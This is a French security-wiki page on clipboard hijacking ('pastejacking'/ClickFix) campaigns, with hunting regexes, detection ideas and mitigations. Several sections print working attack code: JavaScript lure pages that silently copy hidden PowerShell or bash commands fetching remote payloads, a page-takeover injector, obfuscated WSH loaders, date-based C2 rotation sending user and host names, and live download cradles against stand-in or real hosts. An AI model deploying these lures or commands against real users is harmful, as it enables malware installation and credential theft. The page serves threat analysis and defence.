# Attaques de Clipboard Hijacking (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – ancien conseil, mais toujours valable

## Overview

Clipboard hijacking – aussi connu sous le nom de *pastejacking* – abuse du fait que les users copient-collent régulièrement des commandes sans les inspecter. Une page web malveillante (ou tout contexte capable d’exécuter du JavaScript, comme une application Electron ou Desktop) place de manière programmatique du texte contrôlé par l’attaquant dans le system clipboard. Les victimes sont encouragées, normalement via des instructions de social-engineering soigneusement élaborées, à appuyer sur **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), ou à ouvrir un terminal et à *paste* le contenu du clipboard, exécutant immédiatement des commands arbitraires.

Comme **aucun fichier n’est téléchargé et aucune pièce jointe n’est ouverte**, la technique contourne la plupart des contrôles de sécurité e-mail et web-content qui surveillent les pièces jointes, les macros ou l’exécution directe de commandes. L’attaque est donc populaire dans les campagnes de phishing qui distribuent des familles de malware courantes comme NetSupport RAT, Latrodectus loader ou Lumma Stealer.

## Wallet-address replacement clippers

Une autre variante de **clipboard hijacking** ne colle pas des commands du tout : elle attend que la victime copie une **cryptocurrency wallet address**, puis la remplace silencieusement par une adresse contrôlée par l’attaquant juste avant le paste. Cela est particulièrement efficace contre les formats de wallet longs, car les users ne vérifient souvent que les premiers/derniers caractères.

Traits courants dans le monde réel :
- **Thin loader + nested payload** : l’app/exe visible ressemble à un outil de trading ou de "profit" légitime, tandis que le vrai clipper est caché plus profondément dans le bundle (par exemple un loader .NET lançant un nested Rust payload).
- **Regex-driven replacement** : le malware fait correspondre des chaînes telles que `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, ou même des chaînes génériques **44-character Solana-like** et les réécrit avec des wallets de l’attaquant.
- **Wallet rotation at scale** : les échantillons Windows modernes peuvent intégrer **des milliers** de wallets de remplacement par currency au lieu d’une seule adresse statique, réduisant l’exposition de la réputation du wallet après chaque vol.

### Windows clipper flow

Une implémentation courante est une fenêtre cachée enregistrée avec **`AddClipboardFormatListener`**. À chaque mise à jour du clipboard, le malware appelle généralement :
- **`OpenClipboard`** → accéder aux données actuelles du clipboard.
- **`GetClipboardData`** → lire le texte.
- **`EmptyClipboard`** + **`SetClipboardData`** → remplacer la chaîne du wallet par la valeur de l’attaquant.

Minimal hunting regexes fréquemment observées dans les clippers :
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
La persistance au niveau utilisateur suffit pour avoir un impact. Un schéma observé est :
- Copier le payload vers **`%APPDATA%\silke\silke.exe`**
- Créer un **Startup-folder LNK** sous `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Idées de détection :
- Des processus qui appellent en continu les APIs du clipboard tout en écrivant sous `%APPDATA%` et le dossier **Startup** de l’utilisateur.
- Nouvelle création de LNK/executable suivie de réécritures du clipboard d’adresse de wallet.
- Des archives ou bundles de faux logiciels contenant de nombreux fichiers inutilisés plus un petit launcher qui démarre un binaire imbriqué.

### macOS social-engineered quarantine removal + LaunchAgent persistence

Sur macOS, certaines campagnes livrent un utilitaire **`unlocker.command`** et demandent à la victime de faire un clic droit → **Open** si Gatekeeper indique que l’app est endommagée ou provient d’un développeur non identifié. Le script supprime simplement la quarantine et lance le `.app` voisin :
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Ce n'est **pas** un exploit Gatekeeper ; c'est un **contournement de quarantaine par ingénierie sociale** qui exploite le fait que les décisions de Gatekeeper dépendent de l'attribut étendu `com.apple.quarantine`.

Après exécution, le clipper peut persister sous l'utilisateur courant en écrivant :
- **`~/launch.sh`** – script wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent avec `RunAtLoad` et `KeepAlive`

Un détail défensif utile est que certains échantillons implémentent un **watchdog d'autoguérison** qui réécrit le LaunchAgent et le wrapper toutes les ~30 secondes. Si vous supprimez d'abord le plist **sans tuer le processus en cours**, le malware peut le recréer immédiatement. Ordre de nettoyage sûr :
1. Tuer le processus actif du clipper.
2. Décharger/supprimer le plist du LaunchAgent.
3. Supprimer `~/launch.sh` et la charge utile copiée.

### Note de livraison : fausse réputation comme multiplicateur de force

Pour cette famille, le malware lui-même peut rester techniquement simple tandis que la **couche de distribution** fait le gros du travail : faux stars/forks GitHub, avis/téléchargements SourceForge, commentaires/vues de tutoriels YouTube, et commentaires/votes VirusTotal d'apparence bénigne sont utilisés pour faire paraître le binaire digne de confiance avant l'exécution.

## Forced copy buttons and hidden payloads (macOS one-liners)

Certains infostealers macOS clonent des sites d'installation (par ex., Homebrew) et **forcent l'utilisation d'un bouton “Copy”** afin que les utilisateurs ne puissent pas sélectionner uniquement le texte visible. L'entrée du clipboard contient la commande d'installation attendue plus une charge utile Base64 ajoutée (par ex., `...; echo <b64> | base64 -d | sh`), de sorte qu'un seul collage exécute les deux tandis que l'UI masque l'étape supplémentaire.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Les anciennes campagnes utilisaient `document.execCommand('copy')`, les plus récentes s’appuient sur l’**Clipboard API** asynchrone (`navigator.clipboard.writeText`).

## Le flux ClickFix / ClearFake

1. L’utilisateur visite un site typosquatted ou compromis (par ex. `docusign.sa[.]com`)
2. Le JavaScript injecté **ClearFake** appelle un helper `unsecuredCopyToClipboard()` qui stocke silencieusement dans le clipboard une one-liner PowerShell encodée en Base64.
3. Des instructions HTML indiquent à la victime : *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
4. `powershell.exe` s’exécute, télécharge une archive qui contient un exécutable légitime ainsi qu’une DLL malveillante (classic DLL sideloading).
5. Le loader déchiffre des étapes supplémentaires, injecte du shellcode et installe la persistence (par ex. scheduled task) – exécutant finalement NetSupport RAT / Latrodectus / Lumma Stealer.

### Exemple de chaîne NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart légitime) recherche dans son répertoire `msvcp140.dll`.
* Le DLL malveillant résout dynamiquement les APIs avec **GetProcAddress**, télécharge deux binaires (`data_3.bin`, `data_4.bin`) via **curl.exe**, les décrypte en utilisant une clé XOR roulante `"https://google.com/"`, injecte le shellcode final et décompresse **client32.exe** (NetSupport RAT) vers `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Télécharge `la.txt` avec **curl.exe**
2. Exécute le téléchargeur JScript dans **cscript.exe**
3. Récupère une charge utile MSI → dépose `libcef.dll` à côté d’une application signée → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
L’appel **mshta** lance un script PowerShell masqué qui récupère `PartyContinued.exe`, extrait `Boat.pst` (CAB), reconstruit `AutoIt3.exe` via `extrac32` et la concaténation de fichiers, puis exécute finalement un script `.a3x` qui exfiltre les identifiants du navigateur vers `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK avec C2 rotatif (PureHVNC)

Certaines campagnes ClickFix évitent complètement les téléchargements de fichiers et demandent aux victimes de coller une ligne unique qui récupère et exécute du JavaScript via WSH, le rend persistant, et fait tourner le C2 quotidiennement. Chaîne observée en exemple :
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Traits clés
- URL obfusquée inversée à l’exécution pour déjouer l’inspection superficielle.
- Le JavaScript se persiste via un Startup LNK (WScript/CScript), et sélectionne le C2 selon le jour en cours – permettant une rotation rapide des domaines.

Fragment JS minimal utilisé pour faire tourner les C2 par date:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
La prochaine étape déploie généralement un loader qui établit la persistance et récupère un RAT (par ex. PureHVNC), en pinning souvent TLS à un certificat codé en dur et en découpant le trafic en fragments.

Idées de détection spécifiques à cette variante
- Arbre de processus : `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ou `cscript.exe`).
- Artefacts de démarrage : LNK dans `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoquant WScript/CScript avec un chemin JS sous `%TEMP%`/`%APPDATA%`.
- Télémetrie Registry/RunMRU et de ligne de commande contenant `.split('').reverse().join('')` ou `eval(a.responseText)`.
- `powershell -NoProfile -NonInteractive -Command -` répété avec de gros payloads stdin pour alimenter de longs scripts sans longues lignes de commande.
- Scheduled Tasks exécutant ensuite des LOLBins tels que `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` sous une tâche/un chemin ressemblant à un updater (par ex. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Noms d’hôte et URLs C2 rotatifs quotidiennement avec le motif `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Corréler les événements d’écriture du presse-papiers suivis d’un collage Win+R puis d’une exécution immédiate de `powershell.exe`.


Les blue-teams peuvent combiner les télémétries du presse-papiers, de création de processus et de Registry pour repérer l’abus de pastejacking :

* Windows Registry : `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` conserve l’historique des commandes **Win + R** – cherchez des entrées Base64 / obfusquées inhabituelles.
* Security Event ID **4688** (Process Creation) où `ParentImage` == `explorer.exe` et `NewProcessName` dans { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** pour les créations de fichiers sous `%LocalAppData%\Microsoft\Windows\WinX\` ou dans des dossiers temporaires juste avant l’événement 4688 suspect.
* Capteurs EDR du presse-papiers (si présents) – corrélez `Clipboard Write` immédiatement suivi d’un nouveau processus PowerShell.

## Pages de vérification de style IUAM (ClickFix Generator) : copie du presse-papiers vers la console + payloads adaptés à l’OS

Des campagnes récentes produisent en masse de fausses pages de vérification CDN/browser ("Just a moment…", style IUAM) qui contraignent les utilisateurs à copier depuis leur presse-papiers des commandes spécifiques à l’OS dans des consoles natives. Cela détourne l’exécution hors du sandbox du navigateur et fonctionne sur Windows et macOS.

Caractéristiques clés des pages générées par le builder
- Détection de l’OS via `navigator.userAgent` pour adapter les payloads (PowerShell/CMD sous Windows vs. Terminal sous macOS). Decoys/no-ops optionnels pour les OS non pris en charge afin de maintenir l’illusion.
- Copie automatique dans le presse-papiers lors d’actions UI bénignes (checkbox/Copy), tandis que le texte visible peut différer du contenu du presse-papiers.
- Blocage mobile et popover avec des instructions étape par étape : Windows → Win+R→coller→Entrée ; macOS → ouvrir Terminal→coller→Entrée.
- Obfuscation optionnelle et injecteur monofichier pour écraser le DOM d’un site compromis avec une UI de vérification stylée Tailwind (aucune nouvelle registration de domaine requise).

Exemple : mismatch du presse-papiers + branchement adapté à l’OS
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Persistance de macOS lors de l’exécution initiale
- Utilisez `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` afin que l’exécution continue après la fermeture du terminal, réduisant les artefacts visibles.

Prise de contrôle de page in situ sur les sites compromis
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
- Idées de détection et de hunting spécifiques aux leurres de type IUAM
- Web: Pages qui lient l’Clipboard API à des widgets de vérification; incohérence entre le texte affiché et la charge utile du clipboard; branchement `navigator.userAgent`; Tailwind + remplacement single-page dans des contextes suspects.
- Point de terminaison Windows: `explorer.exe` → `powershell.exe`/`cmd.exe` peu après une interaction navigateur; installateurs batch/MSI exécutés depuis `%TEMP%`.
- Point de terminaison macOS: Terminal/iTerm lançant `bash`/`curl`/`base64 -d` avec `nohup` près d’événements navigateur; tâches en arrière-plan survivant à la fermeture du terminal.
- Corréler l’historique `RunMRU` Win+R et les écritures du clipboard avec la création ultérieure de processus console.

Voir aussi pour les techniques de support

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / évolutions de ClickFix (ClearFake, Scarlet Goldfinch)

- ClearFake continue de compromettre des sites WordPress et d’injecter du JavaScript de loader qui enchaîne des hosts externes (Cloudflare Workers, GitHub/jsDelivr) et même des appels blockchain “etherhiding” (par ex., des POST vers des endpoints Binance Smart Chain API tels que `bsc-testnet.drpc[.]org`) pour récupérer la logique de leurre actuelle. Les overlays récents utilisent fortement de faux CAPTCHAs qui demandent aux utilisateurs de copier/coller une one-liner (T1204.004) au lieu de télécharger quoi que ce soit.
- L’exécution initiale est de plus en plus déléguée à des script hosts/LOLBAS signés. En janvier 2026, des chaînes ont remplacé l’usage précédent de `mshta` par le `SyncAppvPublishingServer.vbs` intégré, exécuté via `WScript.exe`, en passant des arguments de type PowerShell avec alias/wildcards pour récupérer du contenu distant:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` est signé et normalement utilisé par App-V ; associé à `WScript.exe` et à des arguments inhabituels (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs), il devient une étape LOLBAS à fort signal pour ClearFake.
- En février 2026, les faux payloads CAPTCHA sont revenus à de purs download cradles PowerShell. Deux exemples en direct :
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- La première chaîne est un grabber en mémoire `iex(irm ...)` ; la seconde passe par `WinHttp.WinHttpRequest.5.1`, écrit un fichier temporaire `.ps1`, puis le lance avec `-ep bypass` dans une fenêtre masquée.

Conseils de détection/chasse pour ces variantes
- Lignée de processus : navigateur → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ou cradles PowerShell immédiatement après des écritures dans le clipboard/Win+R.
- Mots-clés de ligne de commande : `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domaines jsDelivr/GitHub/Cloudflare Worker, ou patterns `iex(irm ...)` avec IP brute.
- Réseau : requêtes sortantes vers des hosts CDN worker ou des endpoints blockchain RPC depuis des hôtes script/PowerShell peu après la navigation web.
- Fichier/registre : création temporaire de `.ps1` sous `%TEMP%` plus des entrées RunMRU contenant ces one-liners ; bloquer/alerter sur des LOLBAS de scripts signés (WScript/cscript/mshta) exécutant des URLs externes ou des chaînes d’alias obfusquées.

## Mitigations

1. Durcissement du navigateur – désactiver l’accès en écriture au clipboard (`dom.events.asyncClipboard.clipboardItem` etc.) ou exiger une action utilisateur.
2. Sensibilisation sécurité – apprendre aux utilisateurs à *taper* les commandes sensibles ou à les coller d’abord dans un éditeur de texte.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control pour bloquer les one-liners arbitraires.
4. Contrôles réseau – bloquer les requêtes sortantes vers les domaines connus de pastejacking et de malware C2.

## Trucs associés

* **Discord Invite Hijacking** abuse souvent de la même approche ClickFix après avoir attiré les utilisateurs dans un serveur malveillant :

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Références

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
